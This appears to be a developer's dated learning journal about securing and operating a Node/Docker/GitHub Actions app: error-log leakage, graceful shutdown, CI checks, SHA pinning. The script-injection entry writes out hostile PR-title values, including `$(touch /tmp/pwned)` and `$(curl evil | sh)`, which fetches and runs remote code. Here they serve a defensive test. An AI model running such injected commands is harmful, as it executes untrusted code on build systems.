- **Say it in an interview:** "Secrets only arrive as environment variables when a container starts: never in an image layer, never in the browser bundle, never in a log line. The Claude key is read only by the API, lives in SSM, and has a spend limit at the provider."
- **Follow-ups to expect:** A secret got committed, what now? (Revoke it at the provider first; deleting the commit doesn't help because clones and forks keep it.)

### 2026-10-30 — Error objects can leak more than their message `#security` `#gotcha` `#database`
- **What happened:** A planted-error test printed an unhandled pg error, and Vitest's report showed its `client` field with `password: 'runtime-test'`. My first note said logging any pg error would leak the password. The final review showed that's too broad, and I checked it myself:
  - pg-pool attaches the client only to idle-connection errors;
  - pg defines `password` as a hidden (non-enumerable) property, so default `console.log`/`util.inspect` and `JSON.stringify` don't show it;
  - serializers that read hidden properties do show it: `util.inspect(e, { showHidden: true })`, `%o`, and test-runner or error-reporting tools.

  Two more problems:
  - Drizzle wraps the real reason in `error.cause`, so logging only `error.message` printed a useless "Failed query: CREATE SCHEMA…".
  - Drizzle's message ends with `params:` and the query's values, which from P1 will be phone numbers and session tokens.

  Fix: `describeError()` joins the messages along the `cause` chain, cuts each one at `params:`, and shows only the kind of a thrown non-Error. Every entry point goes through `runProcess()`, so even a startup crash is logged that way. All of it is tested.
- **Why / what I learned:** Libraries attach context to errors for debugging: connections, query values. Whether it's printed depends on the serializer, so log only fields you chose, and follow `cause` to keep the useful reason. Also, verify a security claim before writing it down.
- **Say it in an interview:** "I log only error messages, never error objects. pg-pool attaches the client to some errors, and its password is hidden but still printed by serializers that read hidden properties. Drizzle's messages also include query values, so I strip those. The log still says 'password authentication failed', just not the password or the customer's data."
- **Follow-ups to expect:** What is `Error.cause`? (A standard way to wrap a lower-level error inside a higher-level one, so you keep both.)

### 2026-10-30 — An unhandled `error` event crashes Node: the pool needs a handler `#backend` `#database` `#gotcha`
- **What happened:** When the database restarts, idle pooled connections die, and `pg` emits an `error` event on the pool. An `EventEmitter` with no `error` listener throws, which kills the whole process. A database blip would crash the API. `createDatabase(url, onPoolError)` makes the handler a required argument. A test kills the runtime role's connections with `pg_terminate_backend` and checks that the handler ran and the next query works. Removing the handler made the test fail with exactly that unhandled error.
- **Why / what I learned:** In Node, the `error` event is special: unhandled means crash. Making the safe thing required in the function signature beats remembering it.
- **Say it in an interview:** "My pool's error handler is a required parameter, because Node crashes on an unhandled `error` event, and pg raises one whenever the database drops an idle connection. A test kills connections from the server side to prove the API survives."
- **Follow-ups to expect:** What happens to queries during the outage? (They fail, and `/ready` returns 503. When the database is back, the pool opens new connections. Checked in Docker: no restart needed.)

### 2026-10-30 — Compile once, read source everywhere else: project references + export conditions `#architecture` `#backend` → ADR 0020
- **What happened:** Node couldn't run our TypeScript packages (known since P0.2), and NestJS needs a compiler anyway for decorator metadata. Each package now builds to `dist/` with `tsc -b` (project references build `shared` → `db` → `api` in order). Packages export a custom `source` condition pointing at `src/*.ts`. TypeScript (`customConditions`), ESLint and Vitest use it, so tests and lint need no build, and Node uses the `default` condition (`dist/*.js`). Checked by deleting every `dist/` and running `pnpm check`. `pnpm dev` runs `tsc -b -w` and `node --watch` together, restarting about 4 s after a save.
- **Why / what I learned:** Different tools can see different files through one `exports` map. Production should run compiled JavaScript, and fast feedback shouldn't need a build.
- **Say it in an interview:** "Tests and the editor read my packages' TypeScript through a custom export condition. Node reads compiled output. `tsc -b` builds them in dependency order."
- **Follow-ups to expect:** Why not bundle? (One more tool, esbuild can't emit decorator metadata, and stack traces point into a bundle.)

### 2026-10-30 — One image, three commands, and migrations first `#devops` `#database` → ADRs 0020, 0021
- **What happened:** A multi-stage Dockerfile on `node:24-slim`:
  - pnpm via Corepack;
  - `pnpm deploy --prod` copies the API with only its production dependencies, workspace packages included;
  - it runs as the non-root `node` user, with root-owned files.

  It's 375 MB, of which the app is 40 MB. Compose runs it three ways: `migrate` (one-shot, as `app_owner`), then `api` and `worker` (as `app_runtime`), which start only after `migrate` exits 0. With a wrong owner password, `migrate` exited 1 with "password authentication failed", and `api`/`worker` stayed `Created`. The first build took about 12 minutes on a very slow connection; later builds reuse the cached install layer.
- **Why / what I learned:** The schema must be upgraded before new code runs, by the only role allowed to change it. Manifests are copied before sources so the dependency layer stays cached.
- **Say it in an interview:** "One image, three commands. A one-shot migrate container upgrades the schema as the owner role, and the app containers depend on it completing successfully, so a failed migration stops the rollout before anything changes."
- **Follow-ups to expect:** What if the new code isn't compatible with the old schema during a deploy? (Keep migrations backwards-compatible: add first, remove in a later release.)

### 2026-10-30 — Liveness vs readiness `#devops` `#backend`
- **What happened:** `GET /api/health` returns 200 whenever the process answers. Docker's healthcheck uses it (via `node -e "fetch(...)"`, because the slim image has no curl). `GET /api/health/ready` runs `select 1` as `app_runtime` and returns 503 `{status: "error", database: "unreachable"}` if it fails, without leaking the reason to the caller. Tested with a real database, and with a URL to a closed port. In Docker, stopping the database gave 503 on `/ready` and 200 on `/health`, then 200 again after a restart, with no container restarts.
- **Why / what I learned:** A restart check that depends on the database would restart a healthy API during a database outage, again and again, fixing nothing.
- **Say it in an interview:** "Liveness answers 'should Docker restart me?', readiness answers 'should traffic come to me?'. Mixing them causes restart loops during an outage."
- **Follow-ups to expect:** Where does readiness get used? (By the deploy step and the reverse proxy later, to send traffic only to an instance that can serve it.)

### 2026-10-30 — My worker died after 10 seconds: signal listeners don't keep Node alive `#backend` `#devops` `#mistake` `#gotcha`
- **What happened:** In the first Docker run, the worker logged "started", then exited with "Warning: Detected unsettled top-level await", and Docker restarted it (restart count 1). It was waiting on `once(process, 'SIGTERM')`. A listener doesn't keep Node's event loop alive. The only thing that did was the pool's idle connection, which pg closes after 10 s, so Node exited (code 13) while still waiting. My host check had only waited 3 s.

  The fix: `waitForShutdown()` holds a long timer until the signal arrives. The test runs it in a child process (Node strips its types) and checks the process is still running a second later. The first red was for the wrong reason: a broken `C:/C:/` path on Windows. After fixing the path, red with exit 13; after the fix, green. 20 s later in Docker: 0 restarts.
- **Why / what I learned:** Node exits when nothing is pending, regardless of pending promises. Observe longer than the system's slowest timer. Read why a test is red.
- **Say it in an interview:** "My worker exited after exactly 10 seconds, which matched pg's idle timeout. Waiting for a signal doesn't keep Node's event loop alive, so once the pool's last socket closed, the process ended. I reproduced it in a test, held the process open with a timer until SIGTERM, and verified it in Docker."
- **Follow-ups to expect:** Exit code 13? (Node's code for a top-level await that never settled.)

### 2026-10-30 — Graceful shutdown: exit 0, not 143 `#devops` `#backend` → ADR 0020
- **What happened:** `docker compose stop` gave the worker exit 0 but the API 143. NestJS's `enableShutdownHooks()` closes the app and then re-raises SIGTERM, so the process ends "killed by signal" (128 + 15). It was still graceful (0.7 s, not a 10 s kill). I switched the API to the same `waitForShutdown()` + `app.close()` as the worker: both now exit 0 in about 0.7 s. Compose uses `init: true`, so a tiny init process is PID 1 and forwards signals.
- **Why / what I learned:** `docker stop` sends SIGTERM and kills after 10 s. A process that ignores it loses in-flight work. Exit codes are signals to monitoring, so a clean stop should be 0.
- **Say it in an interview:** "On SIGTERM my processes stop taking work, finish what's open, close the database pool and exit 0 in under a second. Docker would otherwise SIGKILL them after 10 seconds."
- **Follow-ups to expect:** Why does PID 1 matter? (The kernel gives PID 1 special signal handling, with no default actions, so a program not written for it may ignore SIGTERM. An init process avoids that.)

### 2026-10-30 — pg-boss needs DDL and DELETE, so it gets its own sandbox role `#database` `#security` → ADR 0022
- **What happened:** Before deciding how the job queue fits "the app can't delete", I read pg-boss 12.38's SQL. It creates tables while running (per-queue partitions, stats partitions) and deletes finished jobs. None of its functions are `SECURITY DEFINER`, so the caller needs those rights. Decision: a third role, `app_queue`, owns only schema `pgboss`; the business-data role can't touch it, and it can't read business tables. Built in P2.7.
- **Why / what I learned:** Read what a library actually does to the database before granting it rights. Docs often don't mention run-time DDL.
- **Say it in an interview:** "My queue library needs to create tables and delete rows by design, so it runs as a separate role sandboxed in its own schema. The 'never delete business data' rule stays true, and the permanent record of each message lives in an outbox table."
- **Follow-ups to expect:** Why not just grant DELETE on the queue tables to the app role? (pg-boss also creates tables at run time, which that role can't do, and its upgrades would become hand-written migrations.)

### 2026-10-30 — Drizzle 0.x silently skips out-of-order migrations `#database` `#git` `#gotcha` → ADR 0021
- **What happened:** If two branches each add a migration and the one with the older timestamp merges second, Drizzle 0.x never applies it, without any error. Rule in `git-workflow.md`: rebase a migration PR on `main` before merging, and regenerate it if `main` got a newer one. A CI check is a candidate for P0.6.
- **Why / what I learned:** Migration tools differ on ordering. Know which one you have before two branches race.
- **Say it in an interview:** "Drizzle applies migrations by timestamp and skips older ones silently, so my workflow makes a migration PR the newest before it merges."
- **Follow-ups to expect:** How do other tools handle it? (Some refuse out-of-order migrations with an error, some apply them. Either is safer than silent.)

### 2026-10-30 — The final review: crashes that skipped my own logging rule `#process` `#security` `#devops`
- **What happened:** A fresh reviewer re-ran all five risks live and found no critical bugs, but three things worth fixing before P1 copies the pattern:
  1. `main.ts` and `worker.ts` had no top-level `catch`. A startup failure printed a raw stack trace, and with the database down the worker crash-looped under `restart: unless-stopped`.
  2. `describeError` let Drizzle's `params:` (query values) into logs.
  3. My notes overstated the pg password fact.

  I also raised one of its minors: `pnpm dev` listened on every interface, so the API was reachable from the shop's Wi-Fi.

  Fixes, each test-first:
  - `runProcess()` wraps all three entry points (one messages-only line, exit 1);
  - `createWorker()` logs a warning when the database is unreachable instead of crashing (planted-error check; Docker: db stopped → worker up, 0 restarts);
  - `params:` is cut off;
  - a `HOST` setting defaults to `127.0.0.1`, with `0.0.0.0` set only inside the container.
- **Why / what I learned:** A rule ("log messages only") must cover the paths nobody thinks of, like a crash before the app's logger exists. A dependency outage at boot is normal on a server, so the service should wait, not crash-loop. Re-grade review findings by their effect: "Minor" Wi-Fi exposure broke a rule the project already applies to the database port.
- **Say it in an interview:** "Every process entry point runs inside one wrapper that turns any crash into a single sanitized log line and exit code 1. The worker tolerates the database being down at boot instead of crash-looping."
- **Follow-ups to expect:** Crash-and-restart vs wait-and-retry? (Crash-restart is fine for real corruption, but for a dependency that's simply not up yet it floods logs and hides the cause. Waiting with a warning says exactly what's wrong.)

### 2026-10-30 — Docker commands I used to check the stack, not just start it `#devops`
- **What happened:** "It started" proved little. These commands found or ruled out real problems:
  - `docker compose ps -a`: shows one-shot containers too (`migrate Exited (0)` is success).
  - `docker inspect <container> --format '{{.RestartCount}}'`: a restart count of 1 exposed the dying worker.
  - `docker compose logs <service> --no-log-prefix`: the "unsettled top-level await" warning was there.
  - `docker run --rm <image> sh -c 'id; ls -a /app; env'`: non-root user, no `.env`, no secret variables.
  - `docker history --no-trunc <image>`: every build instruction, where a leaked `ARG`/`ENV` would show.
  - `docker compose run --rm --no-deps -e VAR=... migrate`: a one-off run with one setting changed (the wrong-password check).
  - `docker stop`/`docker start` on single containers: `docker compose start` can start a service's dependencies too, which once hid the "database down at startup" case.
- **Why / what I learned:** Check the state you care about (restart counts, exit codes, image contents), not the command's success message.
- **Say it in an interview:** "After bringing the stack up, I check restart counts and exit codes, look inside the image for secrets with `docker history`, and stop the database on purpose to see how the services behave."
- **Follow-ups to expect:** How would you see why a container keeps restarting? (`docker compose ps -a` for the exit code, `docker logs` for the last lines, `docker inspect` for the restart count and the OOM-killed flag.)

### 2026-10-30 — Hinglish as a third interface language `#product` `#frontend`
- **What happened:** At the start of P0.5 I added Hinglish (Hindi written in English letters, "Bill banao") next to English and Hindi. Many shopkeepers read Hindi but type and text in Latin letters. Recorded in Module 00 #25 and NFR 7 with change-log lines.
- **Why / what I learned:** A language is not just a translation, it's also a script. Hinglish gets its own standard tag, `hi-Latn` (BCP 47: language `hi`, script `Latn`), so the browser and screen readers know what they're reading.
- **Say it in an interview:** "The app runs in English, Hindi and Hinglish. Hinglish is tagged `hi-Latn`, the standard code for Hindi in Latin script, and tests check that the Hindi file is in Devanagari and the Hinglish one never is."
- **Follow-ups to expect:** Why not just transliterate Hindi automatically? (Hinglish isn't letter-by-letter transliteration: people write "Connected hai", mixing English words in. It has to be written by hand.)

### 2026-10-30 — Web app served by Caddy, same as production `#frontend` `#devops` → ADR 0023
- **What happened:** The web app is a two-stage Docker image: Node builds the static files, then a small Caddy image serves them and passes `/api/*` to the `api` container. Locally Vite's dev server does the same `/api` proxying.
- **Why / what I learned:**
  - Running the real web server locally tests the routing, headers and fallback before the cloud exists.
  - One origin for page and API means cookies work and there's no CORS. The browser needs no configuration, so there's no `VITE_` variable that could leak a secret.
  - Caching: Vite puts a content hash in file names, so `/assets/*` can be cached for a year (`immutable`), while `index.html` is `no-cache` so a new deploy shows up on the next load.
  - The SPA fallback (any unknown path → `index.html`) must not cover `/assets/*`. Otherwise an old tab asking for a deleted chunk gets HTML, cached for a year under a script's name.
  - A strict Content-Security-Policy (`default-src 'self'`) is free while the app loads only its own files, and blocks injected scripts.
- **Say it in an interview:** "Caddy serves the built files and reverse-proxies `/api`, so the browser sees one origin. Hashed assets are cached forever, `index.html` never, and missing assets are a real 404 so the SPA fallback can't poison the cache. A strict CSP blocks scripts from anywhere else."
- **Follow-ups to expect:** What is a reverse proxy? (A server that takes the browser's request and forwards it to another server, here the API, returning its answer as if it were its own.) Why not `vite preview`? (Vite says it's not a production server.)

### 2026-10-30 — PowerShell added a BOM to package.json and broke Vitest `#gotcha` `#tooling`
- **What happened:** I changed the root `package.json` with PowerShell 5.1's `Set-Content -Encoding utf8`, which writes a byte-order mark (BOM, three invisible bytes) at the start. Vitest then failed with "Unexpected token" while reading the file as JSON, and printed a misleading "Cannot find dependency 'jsdom'". `Add-Content` also gave `.prettierignore` Windows line endings.
- **Why / what I learned:** The error you see first isn't always the cause: the real error was above it, in Node's JSON parser. In PowerShell 5.1, "utf8" means "UTF-8 with BOM". Edit files with the editor tools, or with .NET's `UTF8Encoding($false)` (no BOM) when a script must write them.
- **Say it in an interview:** "A test run failed with 'missing dependency', but reading the whole output showed a JSON parse error: a script had written a BOM into package.json. I fixed the file and stopped editing files through PowerShell."
- **Follow-ups to expect:** What is a BOM? (A marker at the start of a text file saying which Unicode encoding it uses. UTF-8 doesn't need one, and JSON parsers reject it.)

### 2026-10-30 — An i18next default would have shown Hinglish users Devanagari `#frontend` `#gotcha` `#testing`
- **What happened:** For a language like `hi-Latn`, i18next by default looks for a missing string in `hi-Latn`, then `hi`, then the fallback `en`. So a Hinglish user would have seen Hindi in Devanagari whenever a Hinglish string was missing. `load: 'currentOnly'` skips the `hi` step. I wrote a test that adds a string to English and Hindi only and expects English in Hinglish, then removed the setting to watch the test fail ("expected 'हिन्दी में' to be 'In English'").
- **Why / what I learned:** Library defaults are designed for regional variants (`en-GB` → `en`), not for a different script. A test should be seen failing before it's trusted.
- **Say it in an interview:** "I found that i18next's fallback chain would show Hinglish users Devanagari, pinned it with `load: 'currentOnly'`, and proved the test catches it by removing the setting."
- **Follow-ups to expect:** How do you stop missing translations in the first place? (A test compares every language file's keys with English, and `t()` keys are type-checked against `en.json`.)

### 2026-10-30 — Two lint plugins that didn't fit out of the box `#tooling` `#frontend`
- **What happened:**
  - `eslint-plugin-jsx-a11y` (accessibility rules) declares support only up to ESLint 9, and we run 10. I planted a missing `alt` on an `<img>` and a hook inside an `if`; both were caught, so it works despite the warning.
  - `eslint-plugin-react-refresh` flagged every TanStack route file, because they export a `Route` object and keep their components private. TanStack's plugin moves those components into their own modules, which is where fast refresh happens, so I turned the rule off for `src/routes/` only, with a comment saying why.
- **Why / what I learned:** A peer-dependency warning means "not promised", not "broken": test it. Turn a rule off as narrowly as possible, and write down the reason.
- **Say it in an interview:** "When a plugin officially didn't support our ESLint version, I proved it worked by planting errors it had to catch, instead of trusting or ignoring the warning."
- **Follow-ups to expect:** What is fast refresh? (Vite swaps a changed React component in the running page without a reload, keeping its state. It only works when a file exports nothing but components.)

### 2026-10-30 — A 404 that said "cache me for a year" `#devops` `#gotcha` `#security` → ADR 0023
- **What happened:** The first `curl -I` check of the Caddy container showed that `/assets/missing.js` answered 404 with `Cache-Control: public, max-age=31536000, immutable`, without the CSP and with `Server: Caddy`. The `header` directives had run before the file server failed, and Caddy's error handling starts a fresh response. Fix: set the long cache only when the file exists (`@exists file`), and answer errors in `handle_errors`, which sets the security headers again plus `Cache-Control: no-store`. A stopped API now gives a clean `502` with the same headers.
- **Why / what I learned:** Browsers may cache a 404 if the headers allow it. Error responses need their own headers, and the only way to know is to look at the real response, not the config.
- **Say it in an interview:** "Checking the real headers with curl, I found my 404s carried the one-year immutable cache and lost the security headers, because the web server's error path builds a new response. Errors now get no-store and the same security headers."
- **Follow-ups to expect:** What does `immutable` add to `max-age`? (It tells the browser not to re-check the file even on reload, which is safe only because the file name changes whenever its content does.)

### 2026-10-30 — Checking the app in a real browser without a browser extension `#testing` `#tooling`
- **What happened:** The Chrome extension disconnected, so I used Chrome itself in headless mode. `chrome --headless --dump-dom` prints the page after its JavaScript has run. A 60-line Node script drove Chrome over the DevTools protocol (the same protocol Playwright uses), with Node 24's built-in WebSocket. It clicked each language, took screenshots, reloaded to check the choice was kept, and collected console errors and CSP violations: none. With the database stopped the badge said "Server is up, but data can't be loaded", with the API stopped "Can't reach the server", and both went back to "Connected".
- **Why / what I learned:** Unit tests ran in jsdom, which has no CSP and no real network. Only a real browser proves the strict CSP doesn't break the built app.
- **Say it in an interview:** "Component tests run in jsdom, but I also loaded the production build in headless Chrome through Caddy, to prove the strict CSP and the `/api` proxy work and the status badge reacts when I stop the database or the API."
- **Follow-ups to expect:** What is the Chrome DevTools Protocol? (The JSON-over-WebSocket interface Chrome's DevTools use. Puppeteer and Playwright are built on it.)

### 2026-10-30 — Two 5-second timeouts racing each other `#bug` `#frontend` `#backend`
- **What happened:** The fresh review stopped the database and loaded the page five times. Twice the badge said "Can't reach the server" instead of "Server is up, but data can't be loaded". The API waits up to 5 s for a database connection before answering 503 (`connectionTimeoutMillis` in `packages/db`), and the browser also gave up at exactly 5 s. Whichever finished first won. I measured it (`curl -w %{time_total}`: 5.005 s, 5.004 s, 3.13 s…), raised the browser's timeout to 10 s, added a test that pins "browser timeout ≥ 2 × the API's database timeout", and re-ran: 6 of 6 correct.
- **Why / what I learned:** When one timeout sits inside another, the outer one must be clearly longer, or the error you report depends on luck. My own check had passed once by chance, and the reviewer repeated it. A check that can race must be run more than once.
- **Say it in an interview:** "A status badge sometimes showed the wrong outage because the browser's 5-second timeout raced the API's 5-second database timeout. I made the outer timeout twice the inner one and pinned that with a test."
- **Follow-ups to expect:** How would you set timeouts across layers? (Each layer's timeout is shorter than the one calling it: database < API < browser < load balancer, so the innermost failure is the one reported.)

### 2026-10-30 — The rest of the P0.5 review, and how I checked each fix `#process` `#security` `#devops`
- **What happened:** Besides the timeout race, the fresh reviewer found:
  - Express's `X-Powered-By` header reaching the browser. Removed with `app.disable('x-powered-by')`, with a test.
  - `/api` without a slash getting the app's HTML. Fixed with a named matcher `@api path /api /api/*`. My first try, `handle /api /api/*`, failed the image build, because `caddy validate` runs in the Dockerfile and `handle` takes one matcher only.
  - TanStack Router's own English error screen replacing the whole app when a page's code can't be downloaded. Replaced with a translated `defaultErrorComponent`.

  Left for later: `/favicon.ico` gets HTML until P0.7 adds an icon, and a redirect on an asset URL carries the long cache header (harmless).
- **Commands that proved things:**
  - `curl -s -o NUL -w "%{http_code} %{time_total}s"`: response time, which exposed the 5.00 s race.
  - `curl -s -D - -o NUL <url>`: only the headers, for GET requests.
  - `docker compose exec -u root web mv /srv/assets/<chunk> /tmp/`: simulate a missing chunk inside the running container, then move it back.
  - `chrome --headless=new --dump-dom --virtual-time-budget=15000 <url>`: the page after its JavaScript has run, repeated in a loop to catch flaky results.
- **Why / what I learned:** Validating config at build time turns a broken web server into a failed build instead of a broken deploy. A fault can be simulated in a running container without changing the image.
- **Say it in an interview:** "My Dockerfile runs `caddy validate`, so a bad web-server config fails the build, not the deploy. To test the error screen I removed a JavaScript chunk from the running container and loaded the page in headless Chrome."
- **Follow-ups to expect:** Why hide `X-Powered-By`? (It's not a vulnerability itself, but it tells attackers which framework's known bugs to try. It costs nothing to remove.)

### 2026-10-31 — DevOps stage 3: CI with five required checks `#devops` `#github` → ADR 0024
- **What happened:** I added GitHub Actions. `ci.yml` runs four jobs in parallel on Ubuntu: `check` (format, lint, types, all tests, build, actionlint), `secrets` (gitleaks over the whole history), `migrations` (a new migration must be newer than `main`'s) and `smoke` (build both images, `docker compose up --wait`, then `scripts/ci/smoke.sh`). `pr-title.yml` checks the title. All five are required in the `protect-main` ruleset. Everything passed on the first run, including the Testcontainers integration tests and the stop-signal checks that Windows can't run.
- **Why / what I learned:** CI is a clean machine that doesn't share my laptop's leftovers, so "works on my machine" becomes "works". Logic longer than a line lives in scripts I can run locally, so a red build is reproducible. `pr-title` is a separate workflow because renaming a PR (`edited`) shouldn't re-run, or cancel, the whole build.
- **Say it in an interview:** "Every PR runs five required checks, including a smoke test that boots the real images with Compose and checks headers, a failing migration and clean shutdowns. Each check is a script I can also run locally."
- **Follow-ups to expect:** Why not Jenkins? (It needs a server to run, pay for and patch; ADR 0012.) Why Testcontainers instead of a `services:` database? (Same setup as the laptop, including the roles bootstrap script.)

### 2026-10-31 — Securing the workflows: SHA pins, read-only token, no secrets `#security` `#devops` → ADR 0024
- **What happened:** Every action is pinned to a 40-character commit SHA with the version in a comment. Dependabot opens one grouped PR a month to update them. It can't see the Docker images I run inside `run:` steps (gitleaks, actionlint), so those are bumped by hand. The workflow token is `contents: read`, checkout doesn't keep the token (`persist-credentials: false`), and CI uses no secrets at all: the smoke test copies `.env.example`'s fake passwords for a throwaway database.
- **Why / what I learned:** In March 2025, attackers moved the tags of `tj-actions/changed-files` to code that printed CI secrets into public logs. Anyone using a version tag ran it; anyone pinned to a SHA didn't. A tag is a movable pointer, a SHA isn't.
- **Say it in an interview:** "I pin actions to commit SHAs because tags can be repointed, as the tj-actions attack showed, and Dependabot keeps the pins fresh. My CI has a read-only token and no secrets, so a hijacked step has nothing to steal."
- **Follow-ups to expect:** What's `pull_request_target` and why avoid it? (It runs with the base repo's token and secrets; checking out the PR's code there runs a stranger's code with your rights.)

### 2026-10-31 — Script injection: a PR title is code if you let it be `#security` `#gotcha`
- **What happened:** The PR-title check reads the title from `env: PR_TITLE: ${{ github.event.pull_request.title }}`, never from `${{ }}` written inside `run:`. I tested the script with a title made of `$(touch /tmp/pwned)`, the same in backticks, and quotes: it was rejected as text and no file appeared.
- **Why / what I learned:** GitHub replaces `${{ }}` before the shell starts, so a title written straight into a script becomes part of the script. Through `env:`, the shell only ever sees it as a variable's value. The bash regex is also kept in a variable, and the title is never `eval`ed.
- **Say it in an interview:** "Anyone can name a pull request `$(curl evil | sh)`. If a workflow pastes the title into a shell script with `${{ }}`, that runs. I pass it through an environment variable, so it's only ever data."
- **Follow-ups to expect:** Which other fields are risky? (Anything a user types: issue and PR titles and bodies, branch names, commit messages, comment text.)

### 2026-10-31 — Proving each check can fail, without polluting history `#testing` `#git` `#process`
- **What happened:** A check that has never failed proves nothing, so I broke each one on purpose: a badly formatted line (`check`), a fake API key (`secrets`, which printed it as `REDACTED`), a wrong expected header (`smoke`, which then printed every container's logs), and a PR renamed to `CI: Add workflows.` (`pr-title`). The first three went on a throwaway branch, run with `gh workflow run ci.yml --ref <branch>`, which I then deleted. The migration check's failure was shown locally with a hand-edited journal.
- **Why / what I learned:** Committing the fake key to the PR branch and reverting it wouldn't have worked: a revert adds a commit, the key stays in history, and every later full-history gitleaks scan would fail. Removing it would need a force-push, which the project forbids.
- **Say it in an interview:** "I proved each CI check could go red by planting a failure for it. I put the fake secret on a throwaway branch, because a revert doesn't remove it from history and the secrets scan reads the whole history."
- **Follow-ups to expect:** How would you silence a known false positive in gitleaks? (A `.gitleaksignore` entry with the finding's fingerprint, reviewed like code.)

### 2026-10-31 — The Docker layer cache in CI: measure it `#devops` `#gotcha` `#cost`
- **What happened:** The smoke job builds the images with `docker/build-push-action` and the GitHub Actions cache (`type=gha`, `mode=max`). First run, empty cache: 2 min 47 s. A re-run of the same commit: 50 s, with every layer `CACHED`. On the throwaway branch, though, nothing was cached, and exporting the cache took 73 s while the `pnpm install` it saves took only 6 s.
- **Why / what I learned:** GitHub's cache is scoped by branch: a run can read its own branch's cache and `main`'s, never a sibling branch's. So PRs benefit once `main` has a cache. On GitHub's fast network the install that took 12 minutes on my laptop takes 6 s, so the cache's real win is skipping the TypeScript and Vite builds and the image export, not the download. `mode=max` is needed to cache the build stage, not just the final image.
- **Say it in an interview:** "I measured my CI cache instead of assuming: cold 2 min 47 s, warm 50 s. I also found GitHub scopes caches by branch, so a new branch only gets `main`'s cache."
- **Follow-ups to expect:** Why are Dockerfile layers ordered manifests-first? (The install layer is reused until a dependency changes; only the source-copy layers rebuild on a code change.)

### 2026-10-31 — Required checks: up to date with `main`, and only from GitHub Actions `#github` `#security` → ADR 0024
- **What happened:** I added a `required_status_checks` rule to `protect-main` with `gh api --method PUT`, sending the existing ruleset plus the new rule, after saving a copy of the old JSON. Each check is bound to the GitHub Actions app (id 15368), and *Require branches to be up to date* is on.
- **Why / what I learned:** Without the app binding, any integration with status-write access could post a green `check`. Without "up to date", the `migrations` check could have run against an older `main`. If `main` gains a migration afterwards, the PR's green check is stale, which is exactly Drizzle's skip trap. Required checks can only be picked once they've run at least once, so GitHub knows their names.
- **Say it in an interview:** "My required checks must come from GitHub Actions and run against the latest `main`. That second rule matters because my migration-order check is only meaningful against the current `main`."
- **Follow-ups to expect:** What's the cost of "up to date"? (When `main` moves, every open PR needs an update and a re-run; fine for a solo project, and merge queues solve it for big teams.)

### 2026-10-31 — My own last PR title would have failed the new check `#git` `#mistake`
- **What happened:** Before turning the PR-title check on, I ran it against every title already on `main`. P0.5's, `chore: build the react web skeleton with caddy and three languages (P0.5)`, has 73 characters, one over the 72 limit in my own git-workflow doc. Only the two titles from before the convention also failed.
- **Why / what I learned:** A written rule nobody checks drifts. Running a new check against past data shows whether the rule is realistic before it starts blocking people.
- **Say it in an interview:** "I back-tested my PR-title check against the existing history. It caught one of my own titles, one character too long, which showed why the rule needed automating."
- **Follow-ups to expect:** Why 72 characters? (Git tools and GitHub's UI truncate longer subject lines; 72 leaves room for indentation in `git log`.)

### 2026-10-31 — The P0.6 review: what my own checks let through `#process` `#database` `#devops`
- **What happened:** A fresh reviewer found nothing critical, but four things worth fixing before merge:
  - Dependabot titles its grouped PRs `ci: bump <action> from X to Y in the actions group`, up to 76 characters, so my 72-character rule would have turned every monthly update red. Fixed: the length rule is waived for `dependabot[bot]` only (author passed through `env:`, like the title).
  - The migration check only looked at new migrations. Editing, re-dating or deleting one that `main` already has passed, though databases that ran it would never see the edit, and a later timestamp would make Drizzle run it twice. Now it fails, with 3 new tests, and also catches an edited or deleted `.sql` file (`git diff --diff-filter=DM` against the merge base).
  - A `catch {}` returned "no migrations" for any error, so a corrupt base journal would have passed. Now only a missing journal means "none"; bad JSON fails the check.
  - `if: failure()` doesn't fire when a job hits its timeout, because GitHub cancels it instead. The logs step is now `failure() || cancelled()`, and `docker compose up --wait` has `--wait-timeout 180`.

  Two doc claims were also wrong. Dependabot doesn't update Docker images run inside `run:`, and "runs on main always finish" isn't true: a queued run can be replaced.
- **Why / what I learned:** A check is only as good as the inputs I imagined. The reviewer thought of the bot's titles, edits to old migrations, and a timeout instead of a failure. A catch-all `catch` in a safety check makes it fail open.
- **Say it in an interview:** "Review found my migration check only looked at new files, so editing an applied migration would have passed and silently drifted production's schema. I extended it to fail on any change to a migration main already has."
- **Follow-ups to expect:** Why can't you just edit a migration that has run? (Drizzle records it as applied and never runs it again, so existing databases keep the old version while fresh ones get the new one. Fix forward with a new migration.)

### 2026-10-31 — `gh` commands for driving CI from the terminal `#devops` `#github` `#tooling`
- **What happened:** I ran and debugged the whole P0.6 pipeline without opening the browser:
  - `gh pr checks 6 --watch`: wait for a PR's checks, then print each result.
  - `gh run view <id> --log-failed`: only the failed steps' logs. A run's logs only become available once the whole run has finished.
  - `gh api --allow-escape-sequences repos/<owner>/<repo>/actions/jobs/<job>/logs`: one job's full log, including BuildKit's `CACHED` lines.
  - `gh workflow run ci.yml --ref <branch>`: start a run by hand on any branch (the `workflow_dispatch` trigger).
  - `gh run rerun <id> --job <job-id>`: re-run one job, e.g. to measure a warm cache.
  - `gh api --method PUT repos/<owner>/<repo>/rulesets/<id> --input ruleset.json`: replace a ruleset. Send all the existing rules plus the new one, after saving the old JSON.
  - `gh api repos/<owner>/<repo>/actions/permissions/workflow`: confirm the default token is read-only.
- **Why / what I learned:** The API shows the real state, so I can check a setting instead of trusting a screenshot. A ruleset `PUT` replaces the whole rule list, so leaving out an existing rule deletes it.
- **Say it in an interview:** "I drove CI from the GitHub CLI: watched checks, pulled only the failed logs, re-ran single jobs to measure caching, and changed branch rules through the API after backing up the old JSON."
- **Follow-ups to expect:** PUT vs PATCH? (PUT replaces the whole resource, PATCH changes the fields you send. GitHub's ruleset update is a PUT, so you send everything.)

### 2026-10-31 — `edited` fires on a description edit too `#github` `#gotcha`
- **What happened:** After I updated PR #6's description, the PR briefly showed "blocked". The `pull_request` `edited` event, which I used so a rename re-runs `pr-title`, also fires when the description or base branch changes. `pr-title` re-ran (5 s), and the required check was pending until it finished.
- **Why / what I learned:** An event name can cover more than the case you added it for. Here it's harmless, and the reason `pr-title` is its own tiny workflow: a description edit doesn't rebuild everything.
- **Say it in an interview:** "My PR-title check listens to `edited` so a rename re-runs it. That event also fires on description edits, which is why it's a separate five-second workflow and not part of the main build."
- **Follow-ups to expect:** How would you run only on title changes? (Compare `github.event.changes.title` in an `if:`, but the check must still report on every new commit, so keep `synchronize`.)
